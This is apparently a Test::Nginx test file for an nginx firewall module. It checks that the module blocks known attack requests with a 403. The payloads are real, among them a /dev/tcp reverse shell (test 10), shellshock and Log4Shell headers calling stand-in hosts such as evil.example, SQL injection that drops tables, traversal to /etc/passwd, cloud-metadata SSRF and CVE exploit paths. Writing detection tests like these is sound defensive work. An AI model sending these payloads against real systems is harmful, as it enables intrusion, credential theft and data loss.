# True positives for the categories added in the second signature pass:
# nosql, ssti, exploit_path, plus a few of the newly expanded existing ones.
use Test::Nginx::Socket 'no_plan';

repeat_each(1);
no_long_string();
run_tests();

__DATA__

=== TEST 1: NoSQL operator injection in query
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?user%5B%24ne%5D=1&pass%5B%24ne%5D=1
--- error_code: 403

=== TEST 2: NoSQL $where in body
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
{"$where":"this.a=='b'"}
--- more_headers
Content-Type: application/json
--- error_code: 403

=== TEST 3: SSTI arithmetic probe
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?name=%7B%7B7*7%7D%7D
--- error_code: 403

=== TEST 4: SSTI object traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=%7B%7B''.__class__%7D%7D
--- error_code: 403

=== TEST 5: exploit path — WebLogic wls-wsat
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/wls-wsat/CoordinatorPortType
--- error_code: 403

=== TEST 6: exploit path — Fortinet fgt_lang traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/remote/fgt_lang?lang=/../../../..//////////dev/
--- error_code: 403

=== TEST 7: exploit path — Spring Actuator gateway RCE
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/actuator/gateway/routes
--- error_code: 403

=== TEST 8: expanded deserial — Java gadget class in body
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/e"}}
--- more_headers
Content-Type: application/json
--- error_code: 403

=== TEST 9: expanded template — Log4Shell rmi variant
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: ${jndi:rmi://evil/a}
--- error_code: 403

=== TEST 10: expanded cmdi — reverse shell via /dev/tcp
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?host=x;bash%20-i%20%3E&%20/dev/tcp/1.2.3.4/4444%200%3E&1
--- error_code: 403

=== TEST 11: expanded traversal — encoded ..%2f
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=..%2f..%2f..%2fetc%2fpasswd
--- error_code: 403

=== TEST 12: expanded ssrf — Alibaba metadata IP
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://100.100.100.200/latest/meta-data/
--- error_code: 403

=== TEST 13: expanded sqli — stacked drop table
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1;%20DROP%20TABLE%20users
--- error_code: 403

=== TEST 14: new categories can be skipped
--- config
    location /t { shield block; shield_skip ssti nosql exploit_path; empty_gif; }
--- request
GET /t?name=%7B%7B7*7%7D%7D&u%5B%24ne%5D=1
--- error_code: 200


=== TEST 15: third-pass exploit_path — vCenter uploadova (CVE-2021-21972)
--- config
    location /ui/vropspluginui/rest/services/uploadova { shield block; empty_gif; }
--- request
POST /ui/vropspluginui/rest/services/uploadova
--- error_code: 403

=== TEST 16: third-pass exploit_path — Citrix /vpn/../vpns/ (CVE-2019-19781)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/vpn/../vpns/cfg/smb.conf
--- error_code: 403

=== TEST 17: third-pass exploit_path — Fortinet sslvpn_websession (CVE-2018-13379)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
--- error_code: 403

=== TEST 18: third-pass exploit_path — OFBiz XML-RPC deserial path (CVE-2020-9496)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/webtools/control/xmlrpc
--- error_code: 403

=== TEST 19: third-pass exploit_path — OFBiz ProgramExport (CVE-2023-49070)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/webtools/control/ProgramExport
--- error_code: 403

=== TEST 20: Grafana plugin traversal (CVE-2021-43798) — caught by traversal cat
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?file=/public/plugins/alertlist/..%2f..%2f..%2f..%2fetc%2fpasswd
--- error_code: 403

=== TEST 21: third-pass exploit_path — F5 TMUI (CVE-2020-5902)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp
--- error_code: 403

=== TEST 22: third-pass java_rce — Confluence OGNL Runtime gadget (CVE-2022-26134)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/%24%7B%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22id%22%29%29%7D/
--- error_code: 403

=== TEST 23: third-pass java_rce — OGNL member-access bypass (Confluence)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
--- error_code: 403

=== TEST 24: third-pass ssrf — AWS IMDSv2 token endpoint
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://169.254.169.254/latest/api/token
--- error_code: 403

=== TEST 25: third-pass ssrf — IAM security-credentials tail
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?u=/latest/meta-data/iam/security-credentials/admin-role
--- error_code: 403

=== TEST 26: shellshock — canonical CVE-2014-6271 prologue in the User-Agent
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: () { :;}; /bin/bash -c "id"
--- error_code: 403

=== TEST 27: shellshock — whitespace-stripped prologue variant
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: (){:;}; echo vulnerable
--- error_code: 403

=== TEST 28: shellshock — CVE-2014-6278 redirection gadget in the Referer
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Referer: () { _;} >_[$($())] { echo hi; }
--- error_code: 403

=== TEST 29: shellshock — mass-scanner "ignored" body
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: () { ignored;}; curl http://evil.example/x
--- error_code: 403

=== TEST 30: shellshock — prologue whose body is a command
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: () { echo shellshock; }
--- error_code: 403

=== TEST 31: overlong — four-byte overlong '/'
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=..%f0%80%80%afetc%f0%80%80%afpasswd
--- error_code: 403

=== TEST 32: overlong — three-byte overlong '.'
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=%e0%80%ae%e0%80%ae/etc/passwd
--- error_code: 403

=== TEST 33: overlong — modified-UTF-8 NUL (%c0%80)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=/etc/passwd%c0%80.png
--- error_code: 403

=== TEST 34: overlong — IIS %u-encoded separator
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=..%u002f..%u002fetc%u002fpasswd
--- error_code: 403

=== TEST 35: nullbyte — triple-encoded traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=%25252e%25252e%25252fetc
--- error_code: 403

=== TEST 36: nullbyte — double-encoded backslash
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=..%255c..%255cwindows
--- error_code: 403

=== TEST 37: nullbyte — %u-encoded NUL
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=/etc/passwd%u0000.png
--- error_code: 403

=== TEST 38: nullbyte — digit-encoded "." double encoding
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=%25%32%65%25%32%65/etc/passwd
--- error_code: 403

=== TEST 39: cmdi still blocks in the request target
# TESTS 39-42: the body-unsafe categories keep FULL strength in the request
# target and the scanned headers. NGX_HTTP_SHIELD_NO_BODY narrows WHERE a
# category applies, never whether it matches.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?cmd=;wget%20http://evil/x
--- error_code: 403

=== TEST 40: xss still blocks in the request target
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?q=<script>alert(1)</script>
--- error_code: 403

=== TEST 41: Log4Shell still blocks in the User-Agent
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: ${jndi:ldap://evil/x}
--- error_code: 403

=== TEST 42: a sensitive-file probe still blocks in the request target
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?file=/etc/passwd
--- error_code: 403

=== TEST 43: sqli is still scanned in the body
# The body scan keeps the categories whose tokens are attack-only in ANY
# position. Classic form-POST SQL injection is exactly what it is for.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request
POST /t
q=1 union select password from users
--- more_headers
Content-Type: application/x-www-form-urlencoded
--- error_code: 403

=== TEST 44: a webshell name is still scanned in the body
# ssi and webshell were BOTH nearly marked body-unsafe, and both classifications
# were wrong. Their signatures are not code a body legitimately carries: the ssi
# set is three SSI directives (and stored-SSI injection is delivered in a body --
# t/04 TEST 13 pins that), and the webshell set is malware NAMES (c99.php,
# weevely, antsword). Nothing benign posts those.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request
POST /t
payload=antsword&target=/uploads/shell.jsp
--- more_headers
Content-Type: application/x-www-form-urlencoded
--- error_code: 403

=== TEST 45: a traversal TARGET is reported as sensitive_file, not traversal
# The traversal category owns the GADGET ("../", "..%2f"). The filename the
# gadget reaches for is a sensitive_file. They were both in the traversal table,
# which meant the filename could not be exempted from the body scan without also
# exempting "../" -- so a docs body that merely NAMED /etc/passwd was blocked.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=/etc/passwd
--- error_code: 403
--- error_log
category=sensitive_file

=== TEST 46: the traversal gadget is still reported as traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=../../../../var/log
--- error_code: 403
--- error_log
category=traversal

=== TEST 47: a full traversal-to-/etc/passwd is still blocked
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=../../../../etc/passwd
--- error_code: 403

=== TEST 48: phase-4 exploit_path -- MOVEit moveitisapi.dll (CVE-2023-34362)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=/moveitisapi/moveitisapi.dll
--- error_code: 403

=== TEST 49: phase-4 exploit_path -- TeamCity auth-test (CVE-2023-42793)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/app/rest/debug/authenticationtest.jsp
--- error_code: 403

=== TEST 50: phase-4 exploit_path -- WebLogic async (CVE-2019-2725)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/_async/asyncresponseservice
--- error_code: 403
